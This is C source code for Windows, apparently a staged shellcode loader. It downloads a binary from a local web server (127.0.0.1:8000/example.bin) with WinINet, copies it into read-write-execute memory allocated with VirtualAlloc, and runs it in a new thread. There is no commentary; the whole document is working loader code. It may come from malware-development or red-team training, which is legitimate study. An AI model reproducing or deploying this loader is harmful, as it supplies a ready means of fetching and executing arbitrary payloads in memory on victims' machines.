#include <windows.h>
#include <stdio.h>
#include <Wininet.h>
HINTERNET hInternet,hSession = NULL;
PBYTE pBytes,pTempBytes = NULL;
size_t sSize = NULL;
DWORD bytesread;
int main(int argc, char* argv[])
{
    hInternet = InternetOpenW(NULL,0,NULL,NULL,0);
    if(hInternet == NULL)
    {
        printf("problem with session:%d\n",GetLastError());
        return EXIT_FAILURE;
    }
    hSession = InternetOpenUrlW(hInternet,L"http://127.0.0.1:8000/example.bin",NULL,0,INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_RELOAD,0);
    if(hSession == NULL)
    {
        printf("problem with url:%d\n",GetLastError());
        return EXIT_FAILURE;
    }

    pTempBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    while(InternetReadFile(hSession,pTempBytes,1024,&bytesread) && bytesread !=0)
    {
        sSize += bytesread;
        if (pBytes == NULL)
        {
            pBytes = (PBYTE)LocalAlloc(LPTR, bytesread);
        }
        else
        {
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }
        memcpy((PVOID)(pBytes + (sSize - bytesread)), pTempBytes, bytesread);
        memset(pTempBytes, '\0', bytesread);
        
    }
    InternetCloseHandle(hInternet);
    printf("0x%p\n",pBytes);
    printf("%d\n",sSize);
    PVOID pShellcodeAddress = VirtualAlloc(NULL,(int)sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if (pShellcodeAddress == NULL)
    {
        printf("allocation fail: %d\n", GetLastError());
    }
    memcpy(pShellcodeAddress,pBytes,sSize);
    memset(pBytes, '\0', sSize);

    if (CreateThread(NULL,0,pShellcodeAddress,NULL,0,NULL) == NULL)
    {
        printf("thread error %d\n",GetLastError());
    }
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}